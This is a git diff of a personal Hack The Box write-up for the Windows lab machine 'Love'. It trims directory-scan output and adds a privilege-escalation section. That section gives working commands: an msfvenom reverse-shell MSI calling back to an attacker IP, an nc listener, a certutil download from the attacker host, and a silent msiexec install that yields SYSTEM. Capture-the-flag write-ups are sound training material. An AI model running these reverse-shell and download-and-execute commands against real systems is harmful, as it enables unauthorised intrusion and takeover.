@@ -1,6 +1,6 @@
 # Hackthebox - Love - Windows
 
-- [box](https://app.hackthebox.com/machines/Love)
+- [Box](https://app.hackthebox.com/machines/Love)
 
 ## Nmap
 
@@ -161,56 +161,7 @@ GENERATED WORDS: 4612
 + http://www.love.htb/Admin/com3 (CODE:403|SIZE:302)                                                                                                                                                                                        
 + http://www.love.htb/Admin/con (CODE:403|SIZE:302)                                                                                                                                                                                         
 ==> DIRECTORY: http://www.love.htb/Admin/includes/                                                                                                                                                                                          
-+ http://www.love.htb/Admin/index.php (CODE:200|SIZE:6198)                                                                                                                                                                                  
-+ http://www.love.htb/Admin/lpt1 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/Admin/lpt2 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/Admin/nul (CODE:403|SIZE:302)                                                                                                                                                                                         
-+ http://www.love.htb/Admin/prn (CODE:403|SIZE:302)                                                                                                                                                                                         
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/ADMIN/ ----
-+ http://www.love.htb/ADMIN/aux (CODE:403|SIZE:302)                                                                                                                                                                                         
-+ http://www.love.htb/ADMIN/com1 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/ADMIN/com2 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/ADMIN/com3 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/ADMIN/con (CODE:403|SIZE:302)                                                                                                                                                                                         
-==> DIRECTORY: http://www.love.htb/ADMIN/includes/                                                                                                                                                                                          
-+ http://www.love.htb/ADMIN/index.php (CODE:200|SIZE:6198)                                                                                                                                                                                  
-+ http://www.love.htb/ADMIN/lpt1 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/ADMIN/lpt2 (CODE:403|SIZE:302)                                                                                                                                                                                        
-+ http://www.love.htb/ADMIN/nul (CODE:403|SIZE:302)                                                                                                                                                                                         
-+ http://www.love.htb/ADMIN/prn (CODE:403|SIZE:302)                                                                                                                                                                                         
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/dist/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/images/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/Images/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/plugins/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/admin/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/Admin/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                            
----- Entering directory: http://www.love.htb/ADMIN/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
+[STRIPPED]
                                                                                
 -----------------
 END_TIME: Sat Jul 16 21:02:26 2022
@@ -276,4 +227,17 @@ CALL_SHELL = f"http://{IP}/images/shell.php"
 - We can grab the user flag  
 ![image](https://user-images.githubusercontent.com/96747355/179381861-5cc5fcc4-aeb0-4330-981b-cace1e061e33.png)  
 
-**COMING SOON**
+## Privesc
+
+- We can run winpeas
+
+![always installed](../.res/2022-09-03-20-16-31.png)  
+
+- Let's try this
+- `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=5555 -f msi > gabrielle.msi`
+- We set our listener `rlwrap nc -lvp 5555`
+- We serve it with pythom
+- We get it on the target `certutil.exe -urlcache -f http://10.10.14.2/gabrielle.msi gabrielle.msi`
+- `msiexec /i C:\xampp\htdocs\omrs\images\gabrielle.msi /quiet /qn /norestart`
+- We are root!!  
+![](../.res/2022-09-03-20-25-42.png)
